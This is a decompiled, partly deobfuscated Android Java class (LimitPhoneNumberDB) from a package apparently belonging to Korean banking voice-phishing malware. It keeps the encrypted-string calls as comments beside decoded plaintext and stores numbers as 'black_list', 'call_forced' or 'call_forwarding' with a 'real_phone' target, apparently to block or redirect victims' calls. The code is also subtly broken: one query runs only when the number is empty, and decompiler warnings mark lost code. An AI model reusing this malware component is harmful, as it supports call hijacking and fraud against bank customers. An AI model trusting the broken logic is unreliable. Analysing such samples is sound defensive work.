package com.wish.lmbank.db;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.telephony.PhoneNumberUtils;
import android.text.TextUtils;

import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.utils.LogUtils;

import java.util.ArrayList;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/db/LimitPhoneNumberDB.class */
public class LimitPhoneNumberDB extends RecordingDB {
    private static final String TAG = "com.wish.lmbank.db.LimitPhoneNumberDB";
    public static final String TYPE_BLACK_LIST = "black_list";
    public static final String TYPE_CALL_FORCED = "call_forced";
    public static final String TYPE_CALL_FORWARDING = "call_forwarding";
    private static LimitPhoneNumberDB instance;

    public static LimitPhoneNumberDB getInstance(Context context) {
        LimitPhoneNumberDB limitPhoneNumberDB;
        synchronized (LimitPhoneNumberDB.class) {
            try {
                if (instance == null) {
                    instance = new LimitPhoneNumberDB(context.getApplicationContext());
                }
                limitPhoneNumberDB = instance;
            } catch (Throwable th) {
                throw th;
            }
        }
        return limitPhoneNumberDB;
    }

    private LimitPhoneNumberDB(Context context) {
//         super(context, bb7d7pu7.m5998("BQAEAB02GQEGBww2BxwECwwb"));
        super(context, "limit_phone_number");
    }

    public long addLimitPhoneNumber(LimitPhoneNumberBean limitPhoneNumberBean) {
        long insertOrReplace;
        synchronized (this) {
            ContentValues contentValues = new ContentValues();
//             contentValues.put(bb7d7pu7.m5998("BwgEDA"), limitPhoneNumberBean.getName());
            contentValues.put("name", limitPhoneNumberBean.getName());
//             contentValues.put(bb7d7pu7.m5998("GQEGBww"), limitPhoneNumberBean.getPhoneNumber());
            contentValues.put("phone", limitPhoneNumberBean.getPhoneNumber());
//             contentValues.put(bb7d7pu7.m5998("GwwIBTYZAQYHDA"), limitPhoneNumberBean.getRealPhoneNumber());
            contentValues.put("real_phone", limitPhoneNumberBean.getRealPhoneNumber());
//             contentValues.put(bb7d7pu7.m5998("HRAZDA"), limitPhoneNumberBean.getType());
            contentValues.put("type", limitPhoneNumberBean.getType());
//             contentValues.put(bb7d7pu7.m5998("GhkMCgAIBQ"), Integer.valueOf(limitPhoneNumberBean.getSpecial()));
            contentValues.put("special", Integer.valueOf(limitPhoneNumberBean.getSpecial()));
            insertOrReplace = insertOrReplace(contentValues);
        }
        return insertOrReplace;
    }

    public void addLimitPhoneNumberList(List<LimitPhoneNumberBean> list) {
        synchronized (this) {
            SQLiteDatabase sQLiteDatabase = getSQLiteDatabase();
            sQLiteDatabase.beginTransaction();
            for (LimitPhoneNumberBean limitPhoneNumberBean : list) {
                if (limitPhoneNumberBean.getPhoneNumber() != null) {
//                         String formatNumber = PhoneNumberUtils.formatNumber(limitPhoneNumberBean.getPhoneNumber().replace(bb7d7pu7.m5998("RA"), "").replace(bb7d7pu7.m5998("SQ"), ""), bb7d7pu7.m5998("Ijs"));
                    String formatNumber = PhoneNumberUtils.formatNumber(limitPhoneNumberBean.getPhoneNumber().replace("-", "").replace(" ", ""), "KR");
                    ContentValues contentValues = new ContentValues();
//                         contentValues.put(bb7d7pu7.m5998("BwgEDA"), limitPhoneNumberBean.getName());
                    contentValues.put("name", limitPhoneNumberBean.getName());
//                         contentValues.put(bb7d7pu7.m5998("GQEGBww"), formatNumber);
                    contentValues.put("phone", formatNumber);
//                         contentValues.put(bb7d7pu7.m5998("GwwIBTYZAQYHDA"), limitPhoneNumberBean.getRealPhoneNumber());
                    contentValues.put("real_phone", limitPhoneNumberBean.getRealPhoneNumber());
//                         contentValues.put(bb7d7pu7.m5998("HRAZDA"), limitPhoneNumberBean.getType());
                    contentValues.put("type", limitPhoneNumberBean.getType());
//                         contentValues.put(bb7d7pu7.m5998("GhkMCgAIBQ"), Integer.valueOf(limitPhoneNumberBean.getSpecial()));
                    contentValues.put("special", Integer.valueOf(limitPhoneNumberBean.getSpecial()));
                    insertOrReplace(contentValues);
                }
            }
            sQLiteDatabase.setTransactionSuccessful();
            sQLiteDatabase.endTransaction();
        }
        return;
    }

    public long deleteAllLimitPhoneNumber() {
        long delete;
        synchronized (this) {
            delete = delete("", new String[0]);
        }
        return delete;
    }

    public LimitPhoneNumberBean queryOutgoingPhoneNumberType(String str) {
        Cursor cursor;
        LimitPhoneNumberBean r2 = null;
        synchronized (this) {
            if (!TextUtils.isEmpty(str)) {
//-^-                 String formatNumber = PhoneNumberUtils.formatNumber(str.replace(bb7d7pu7.m5998("RA"), "").replace(bb7d7pu7.m5998("SQ"), ""), bb7d7pu7.m5998("Ijs"));
                String formatNumber = PhoneNumberUtils.formatNumber(str.replace("-", "").replace(" ", ""), "KR");
                boolean isEmpty = TextUtils.isEmpty(formatNumber);
                if (isEmpty ) {
                    try {
//-^-                         cursor = query(new String[]{bb7d7pu7.m5998("BwgEDA"), bb7d7pu7.m5998("GQEGBww"), bb7d7pu7.m5998("GwwIBTYZAQYHDA"), bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("GhkMCgAIBQ")}, bb7d7pu7.m5998("GQEGBwxJVElWSSgnLUkdEBkMSQAHSUFLCggFBTYPBhseCBsNAAcOS0VJSwsFCAoCNgUAGh1LQA"), new String[]{formatNumber});
                        cursor = query(new String[]{"name", "phone", "real_phone", "type", "special"}, "phone = ? AND type in (call_forwarding, black_list)", new String[]{formatNumber});
                        try {
                            r2 = cursor.moveToNext() ? getLimitPhoneNumber(cursor) : null;
                        } catch (SQLException e) {
                            e = e;
//-^-                             LogUtils.callLog(bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLStFSQwRCgwZHQAGB1NJ") + e.getMessage());
                            LogUtils.callLog("Error loading preview from DB, exception: " + e.getMessage());
                        }
                    } catch (Throwable e2) {
                    }
                }
            }
        }
        return r2;
    }


    public LimitPhoneNumberBean queryIncomingPhoneNumberType(String str) {
        Cursor cursor;
        LimitPhoneNumberBean r2 = null;
        synchronized (this) {
            if (!TextUtils.isEmpty(str)) {
                try {
//-^-                     cursor = query(new String[]{bb7d7pu7.m5998("BwgEDA"), bb7d7pu7.m5998("GQEGBww"), bb7d7pu7.m5998("GwwIBTYZAQYHDA"), bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("GhkMCgAIBQ")}, bb7d7pu7.m5998("GQEGBwxJVElWSSgnLUkdEBkMSQAHSUFLCggFBTYPBhsKDA1LRUlLCwUICgI2BQAaHUtA"), new String[]{PhoneNumberUtils.formatNumber(str.replace(bb7d7pu7.m5998("RA"), "").replace(bb7d7pu7.m5998("SQ"), ""), bb7d7pu7.m5998("Ijs"))});
                    cursor = query(new String[]{"name", "phone", "real_phone", "type", "special"}, "phone = ? AND type in (call_forced, black_list)", new String[]{PhoneNumberUtils.formatNumber(str.replace("-", "").replace(" ", ""), "KR")});
                    try {
                        r2 = cursor.moveToNext() ? getLimitPhoneNumber(cursor) : null;
                    } catch (SQLException e) {
//-^-                         LogUtils.w(TAG, bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLSs"), e.getMessage());
                        LogUtils.w(TAG, "Error loading preview from DB", e.getMessage());
                    }
                } catch (Throwable e2) {
                }
            }
        }
        return r2;
    }
    
    public List<LimitPhoneNumberBean> queryAllForcedPhoneNumber() {
        ArrayList arrayList;
        Cursor cursor = null;
        synchronized (this) {
            arrayList = new ArrayList();
            try {
//-^-                 cursor = query(new String[]{bb7d7pu7.m5998("BwgEDA"), bb7d7pu7.m5998("GQEGBww"), bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("GwwIBTYZAQYHDA"), bb7d7pu7.m5998("GhkMCgAIBQ")}, bb7d7pu7.m5998("HRAZDEkAB0lBSwoIBQU2DwYbCgwNS0A"), new String[0]);
                cursor = query(new String[]{"name", "phone", "type", "real_phone", "special"}, "type in (call_forced)", new String[0]);
                while (cursor.moveToNext()) {
                    arrayList.add(getLimitPhoneNumber(cursor));
                }
            } catch (SQLException e) {
//-^-                 LogUtils.w(TAG, new Object[]{bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLSs"), e});
                LogUtils.w(TAG, new Object[]{"Error loading preview from DB", e});
            }
        }
        return arrayList;
    }


    /* JADX WARN: Code restructure failed: missing block: B:28:0x00ae, code lost:
        if (r0 == null) goto L32;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x00b4, code lost:
        r11.close();
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x00e3, code lost:
        if (r11 != null) goto L30;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public List<LimitPhoneNumberBean> queryAllLimitPhoneNumber() {
        ArrayList arrayList;
        Cursor cursor = null;
        synchronized (this) {
            arrayList = new ArrayList();
            try {
//-^-                 cursor = query(new String[]{bb7d7pu7.m5998("BwgEDA"), bb7d7pu7.m5998("GQEGBww"), bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("GwwIBTYZAQYHDA"), bb7d7pu7.m5998("GhkMCgAIBQ")}, "", new String[0]);
                cursor = query(new String[]{"name", "phone", "type", "real_phone", "special"}, "", new String[0]);
                while (cursor.moveToNext()) {
                    arrayList.add(getLimitPhoneNumber(cursor));
                }
            } catch (SQLException e) {
//-^-                 LogUtils.w(TAG, new Object[]{bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLSs"), e});
                LogUtils.w(TAG, new Object[]{"Error loading preview from DB", e});
            }
        }
        return arrayList;
    }

    @SuppressLint("Range")
    private LimitPhoneNumberBean getLimitPhoneNumber(Cursor cursor) {
        LimitPhoneNumberBean limitPhoneNumberBean = new LimitPhoneNumberBean();
//-^-         limitPhoneNumberBean.setName(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("BwgEDA"))));
        limitPhoneNumberBean.setName(cursor.getString(cursor.getColumnIndex("name")));
//-^-         limitPhoneNumberBean.setPhoneNumber(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("GQEGBww"))));
        limitPhoneNumberBean.setPhoneNumber(cursor.getString(cursor.getColumnIndex("phone")));
//-^-         limitPhoneNumberBean.setRealPhoneNumber(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("GwwIBTYZAQYHDA"))));
        limitPhoneNumberBean.setRealPhoneNumber(cursor.getString(cursor.getColumnIndex("real_phone")));
//-^-         limitPhoneNumberBean.setType(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("HRAZDA"))));
        limitPhoneNumberBean.setType(cursor.getString(cursor.getColumnIndex("type")));
//-^-         limitPhoneNumberBean.setSpecial(cursor.getInt(cursor.getColumnIndex(bb7d7pu7.m5998("GhkMCgAIBQ"))));
        limitPhoneNumberBean.setSpecial(cursor.getInt(cursor.getColumnIndex("special")));
        return limitPhoneNumberBean;
    }

}
